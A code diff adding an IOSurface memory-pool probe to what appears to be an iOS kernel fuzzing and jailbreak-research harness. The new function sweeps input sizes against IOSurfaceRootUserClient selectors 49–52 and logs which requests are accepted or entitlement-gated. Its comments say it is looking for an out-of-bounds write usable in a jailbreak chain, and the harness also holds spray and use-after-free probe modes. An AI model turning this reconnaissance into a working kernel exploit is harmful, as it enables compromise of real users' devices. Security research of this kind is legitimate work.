@@ -23629,6 +23629,73 @@ static void p_uatrec(void) {
 //   - 0x41/foreign data              -> DATA-page cross (already closed in §134)
 // The scan runs BEFORE we write our marker, otherwise we would mask any
 // recycled content with it.
+// V152 (p_mempool): IOSurfaceRootUserClient sel49-52 — the memory pool.
+// This is the one userclient path that allocates kernel-side pooled memory
+// sized by request, i.e. the classic under-allocation -> out-of-bounds write
+// shape that a jailbreak chain needs (a write at a KNOWN address with
+// controlled content). Statics from com_apple_iokit_IOSurface:
+//   site.IOSurfaceMemoryPool / site.IOSurfaceMemoryPoolBunch, fields
+//   "Bucket buffer size" / "Descriptors" / "Buckets" / "Contexts",
+//   failure strings "Memory pool ids exhausted", "Unable to pre-allocate
+//   IOSurfaceMemoryPool memory for pool id %llu", "Descriptor length isn't
+//   rounded to bucket size", and a taskCanUsePool() entitlement gate.
+// Phase 1 (here): establish whether the pool is reachable at all from a
+// profile-authorised entitlement set — the gate decides everything downstream.
+static void p_mempool(void) {
+    LOG("[mp] v152 IOSurface memory-pool probe (sel49-52)");
+    io_service_t svc = IOServiceGetMatchingService(kIOMainPortDefault,
+                        IOServiceMatching("IOSurfaceRoot"));
+    if (!svc) { LOG("[mp] no IOSurfaceRoot service"); LOG("[mp] done (alive)"); return; }
+    io_connect_t uc = 0;
+    kern_return_t ok = IOServiceOpen(svc, mach_task_self(), 0, &uc);
+    IOObjectRelease(svc);
+    LOG("[mp] open -> kr 0x%08x conn 0x%x", ok, uc);
+    if (ok || !uc) { LOG("[mp] done (alive)"); return; }
+    uint8_t *inb = must_map(0x4000), *outb = must_map(0x4000);
+    uint64_t osc[4] = {0,0,0,0};
+
+    // sel13 init first: mandatory on this userclient (client must be live).
+    memset(outb, 0, 0x4000);
+    size_t osz = 40; uint32_t nosc = 0;
+    kern_return_t ki = IOConnectCallMethod(uc, 13, NULL, 0, NULL, 0, osc, &nosc, outb, &osz);
+    LOG("[mp] sel13 init -> kr 0x%08x osz 0x%zx  entmask %02x %02x %02x %02x %02x %02x %02x %02x",
+        ki, osz, outb[0],outb[1],outb[2],outb[3],outb[4],outb[5],outb[6],outb[7]);
+
+    // sel49 create_memory_pool(sinStruct VAR). Layout unknown; sweep a small
+    // grid of plausible header shapes and record which are accepted. Every
+    // rejection reason is itself information (0x2c2 = bad size/format,
+    // 0x2e2 = entitlement).
+    static const size_t sizes[] = { 8, 16, 24, 32, 40, 48, 64, 96, 128, 256, 512 };
+    for (unsigned si = 0; si < sizeof(sizes)/sizeof(sizes[0]); si++) {
+        memset(inb, 0, 0x4000); memset(outb, 0, 0x4000);
+        // plausible pool header: poolSize / descriptorLen / bucket fields
+        *(uint64_t *)(inb + 0x00) = 0x1000;      // pool size
+        *(uint64_t *)(inb + 0x08) = 0x1000;      // descriptor length
+        *(uint32_t *)(inb + 0x10) = 1;           // bucket count
+        *(uint32_t *)(inb + 0x14) = 0x1000;      // bucket buffer size
+        osz = 3176; nosc = 0;
+        kern_return_t kr = IOConnectCallMethod(uc, 49, NULL, 0, inb, sizes[si],
+                                               osc, &nosc, outb, &osz);
+        uint32_t pid0 = *(uint32_t *)(outb + 0x00);
+        LOG("[mp] sel49 size %zu -> kr 0x%08x osz 0x%zx pid? %u %s",
+            sizes[si], kr, osz, pid0,
+            kr == 0 ? "*** CREATE ACCEPTED ***" :
+            (kr == 0xe00002e2 ? "(entitlement-gated)" :
+            (kr == 0xe00002c2 ? "(format/size rejected)" : "")));
+        if (kr == 0 && pid0) {
+            uint64_t p64 = pid0;
+            IOConnectCallScalarMethod(uc, 1, &p64, 1, NULL, NULL);  // release
+        }
+    }
+    // sel50 ensure_memory_pool_memory(scalarIn + sinStruct VAR) needs a pool id,
+    // which we do not have if 49 is refused — report and stop there.
+    LOG("[mp] sel50/51/52 need a live pool id from sel49; skipped");
+    IOServiceClose(uc);
+    LOG("[mp] done (alive)");
+    vm_deallocate(mach_task_self(), (vm_address_t)inb, 0x4000);
+    vm_deallocate(mach_task_self(), (vm_address_t)outb, 0x4000);
+}
+
 // V151 (p_scalerdst): hand the scaler a FOREIGN IOSurfaceID as the
 // destination. This is the decisive cross-process test and it does NOT need
 // any DVA oracle.
@@ -25854,6 +25921,7 @@ void *t_iosurface_scaler(void *arg) {
         if (getenv("FUZZ_PTSPRAY")) { p_ptspray(); LOG("[probe13] ptspray-only mode, stop"); return NULL; }
         if (getenv("FUZZ_IDPROBE")) { p_idprobe(); LOG("[probe13] idprobe-only mode, stop"); return NULL; }
         if (getenv("FUZZ_SCALERDST")) { p_scalerdst(); LOG("[probe13] scalerdst-only mode, stop"); return NULL; }
+        if (getenv("FUZZ_MEMPOOL")) { p_mempool(); LOG("[probe13] mempool-only mode, stop"); return NULL; }
         if (getenv("FUZZ_RECLAIM2")) { p_reclaim2(); LOG("[probe13] reclaim2-only mode, stop"); return NULL; }
         if (getenv("FUZZ_RECLAIM")) { p_reclaim(); LOG("[probe13] reclaim-only mode, stop"); return NULL; }
         if (getenv("FUZZ_GPUUAF")) { p_gpuuaf(); LOG("[probe13] gpuuaf-only mode, stop"); return NULL; }
